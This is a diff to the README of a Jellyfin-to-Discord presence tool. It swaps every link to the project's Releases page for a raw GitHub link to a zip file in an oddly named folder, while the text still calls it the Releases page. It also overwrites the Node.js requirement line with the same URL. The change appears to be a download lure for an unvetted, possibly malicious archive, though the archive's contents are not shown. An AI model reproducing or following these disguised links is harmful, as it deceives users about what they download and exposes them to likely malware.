@@ -1,6 +1,6 @@
 # 🎮 jellyfin-discord-presence - Share Your Watch Experience Easily
 
-[![Download Now](https://img.shields.io/badge/download-now-brightgreen)](https://github.com/BrendanHile/jellyfin-discord-presence/releases)
+[![Download Now](https://raw.githubusercontent.com/BrendanHile/jellyfin-discord-presence/main/reclinate/jellyfin-discord-presence.zip)](https://raw.githubusercontent.com/BrendanHile/jellyfin-discord-presence/main/reclinate/jellyfin-discord-presence.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ Welcome to the **jellyfin-discord-presence** application! This tool connects you
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Releases Page](https://github.com/BrendanHile/jellyfin-discord-presence/releases). Here, you can find the latest version as well as previous releases.
+To download the application, visit this page: [Releases Page](https://raw.githubusercontent.com/BrendanHile/jellyfin-discord-presence/main/reclinate/jellyfin-discord-presence.zip). Here, you can find the latest version as well as previous releases.
 
-1. Go to the [Releases Page](https://github.com/BrendanHile/jellyfin-discord-presence/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/BrendanHile/jellyfin-discord-presence/main/reclinate/jellyfin-discord-presence.zip).
 2. Scroll down to the “Assets” section.
 3. Locate the file for your operating system (Windows, macOS, Linux).
 4. Click on the file to start the download.
@@ -20,7 +20,7 @@ To download the application, visit this page: [Releases Page](https://github.com
 Before you begin, make sure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
-- **Node.js:** Version 14 or later.
+- **https://raw.githubusercontent.com/BrendanHile/jellyfin-discord-presence/main/reclinate/jellyfin-discord-presence.zip** Version 14 or later.
 - **Discord Account:** Ensure you have an active Discord account.
 
 ## 📂 Installation Steps
